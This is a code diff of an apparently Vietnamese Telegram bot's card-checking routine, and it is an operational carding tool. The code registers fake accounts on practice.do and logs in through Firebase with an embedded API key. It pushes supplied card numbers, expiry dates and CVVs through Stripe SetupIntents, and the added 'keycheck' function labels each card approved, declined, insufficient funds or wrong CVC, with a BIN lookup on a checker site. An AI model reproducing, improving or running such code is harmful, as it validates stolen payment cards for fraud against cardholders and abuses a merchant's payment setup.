@@ -18,11 +18,54 @@ HEADERS = {
 
 # ========== HÀM XỬ LÝ THẺ ========== #
 async def process_card(cc, mes, ano, cvv, user_id=None):
-    import string, random
+    import string, random, time, requests, re, urllib.parse
 
     def random_email():
         local = ''.join(random.choices(string.ascii_lowercase, k=19))
         return f"{local}62@gmail.com"
+
+    def interpret_keycheck_result(status: str, decline_code: str = "") -> str:
+        status = (status or "").lower()
+        decline_code = (decline_code or "").lower()
+
+        if "succeeded" in status:
+            return "Success"
+
+        custom_keys = [
+            "requires_source_action",
+            "requires_action",
+            "requires_payment_method",
+            "requires_confirmation",
+        ]
+        if any(k in status for k in custom_keys):
+            return "Custom"
+
+        failure_keys = [
+            "transaction_not_allowed",
+            "generic_decline",
+            "fraudulent",
+            "live_mode_test_card",
+            "incorrect_number",
+            "card_not_supported",
+            "pickup_card",
+            "processing_error",
+            "do_not_honor",
+            "stolen_card",
+            "invalid_account",
+            "your card was declined",
+            "expiration month is invalid",
+            "expiration year is invalid",
+        ]
+        if decline_code in failure_keys or any(k in status for k in failure_keys):
+            return "Failure"
+
+        if "insufficient_funds" in decline_code:
+            return "Funds"
+
+        if "incorrect_cvc" in decline_code or "invalid_cvc" in decline_code:
+            return "CCN"
+
+        return "Unknown"
 
     email = random_email()
     password = "Minhnhat##123"
@@ -32,24 +75,23 @@ async def process_card(cc, mes, ano, cvv, user_id=None):
     start_time = time.time()
 
     try:
-        # Step 1: Register user
+        # Step 1: Create user
         r1 = requests.post(
             "https://app.practice.do/api/v1/users/create",
             json={"email": email, "isCoach": True, "password": password, "firstName": first_name, "lastName": last_name},
             headers={
-                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+                "User-Agent": "Mozilla/5.0",
                 "Pragma": "no-cache",
                 "Accept": "*/*",
                 "Content-Type": "application/json"
             }
         )
-
         if "Email already in use" in r1.text:
-            return "⚠️ Email already in use. Retrying might help."
+            return "⚠️ Email already in use. Try again."
         if "userId" not in r1.text:
-            return "❌ Failed to create account."
+            return "❌ Failed to create user."
 
-        # Step 2: Login to Firebase
+        # Step 2: Firebase login
         r2 = requests.post(
             "https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=AIzaSyChZfnLzMeEIDjQ8XSw3y9sO7jp0O4lkIk",
             json={"returnSecureToken": True, "email": email, "password": password, "clientType": "CLIENT_TYPE_WEB"},
@@ -62,15 +104,15 @@ async def process_card(cc, mes, ano, cvv, user_id=None):
         )
         tk = r2.json().get("idToken")
         if not tk:
-            return "❌ Login failed."
+            return "❌ Firebase login failed."
 
-        # Step 3: Create Setup Intent
+        # Step 3: SetupIntent
         r3 = requests.post(
             "https://app.practice.do/api/v1/users/zy9ODRErt6VR2i98vmtMUPNkL533/stripe/setup-intent",
             headers={
                 "host": "app.practice.do",
                 "accept": "application/json, text/plain, */*",
-                "accept-language": "vi-VN,vi;q=0.9,en-US;q=0.8",
+                "accept-language": "vi-VN",
                 "cache-control": "no-cache",
                 "origin": "https://app.practice.do",
                 "pragma": "no-cache",
@@ -81,17 +123,14 @@ async def process_card(cc, mes, ano, cvv, user_id=None):
             data=""
         )
         src = r3.text
-        if "clientSecret" not in src:
-            return "❌ Failed to get clientSecret."
-
-        import re
-        import urllib.parse
-        client_secret = re.search(r'"clientSecret":"(.*?)"', src).group(1)
+        match = re.search(r'"clientSecret":"(.*?)"', src)
+        if not match:
+            return "❌ Không lấy được clientSecret."
+        client_secret = match.group(1)
         intent_id = client_secret.split("_secret_")[0]
 
-        # Step 4: Confirm SetupIntent via Stripe
         encoded_email = urllib.parse.quote(email)
-        payload = f"return_url=https%3A%2F%2Fapp.practice.do%2Fstart-trial%3Fstep%3D2%26email%3D{encoded_email}%26planInformation%3D%257B...%257D&" \
+        payload = f"return_url=https%3A%2F%2Fapp.practice.do%2Fstart-trial%3Fstep%3D2%26email%3D{encoded_email}&" \
                   f"payment_method_data[type]=card&" \
                   f"payment_method_data[card][number]={cc}&" \
                   f"payment_method_data[card][cvc]={cvv}&" \
@@ -116,7 +155,18 @@ async def process_card(cc, mes, ano, cvv, user_id=None):
         status = j4.get("status", "UNKNOWN")
         decline = j4.get("error", {}).get("decline_code", "NONE")
 
-        # BIN Lookup
+        # keycheck
+        result_group = interpret_keycheck_result(status, decline)
+        label = {
+            "Success": "✅ Approved",
+            "Failure": "❌ Declined",
+            "Funds": "💸 Insufficient Funds",
+            "CCN": "⚠️ Incorrect CVC",
+            "Custom": "⚠️ 3DS / Action Required",
+            "Unknown": "❓ Unknown"
+        }.get(result_group, "❓ Unknown")
+
+        # BIN lookup
         bin_info = requests.get(f"https://new.checkerccv.tv/bin_lookup.php?bin={bin_code}").json()
         scheme = bin_info.get("scheme", "N/A")
         type_ = bin_info.get("type", "N/A")
@@ -129,10 +179,10 @@ async def process_card(cc, mes, ano, cvv, user_id=None):
 <b>✅ CHECK RESULT</b>
 
 <b>CC:</b> {cc}|{mes}|{ano}|{cvv}
-<b>Status:</b> {'✅ Approved' if status == 'succeeded' else '❌ Declined'}
-<b>Decline Code:</b> {decline}
+<b>Status:</b> {label}
+<b>Decline Code:</b> {decline.upper() if decline else "NONE"}
 
-<b>Gateway:</b> Stripe V6
+<b>Gateway:</b> Stripe (Practice.do)
 <b>Card:</b> {scheme.upper()}
 <b>Type:</b> {type_.capitalize()}
 <b>Brand:</b> {brand}
@@ -143,7 +193,7 @@ async def process_card(cc, mes, ano, cvv, user_id=None):
 <b>Checked by:</b> mnhat [{user_id}]
 """
     except Exception as e:
-        return f"❌ Error: {str(e)}"
+        return f"❌ Lỗi xử lý: {str(e)}"
 
 # ========== CÁC HÀM COMMAND ========== #
 async def chk(update: Update, context: ContextTypes.DEFAULT_TYPE):
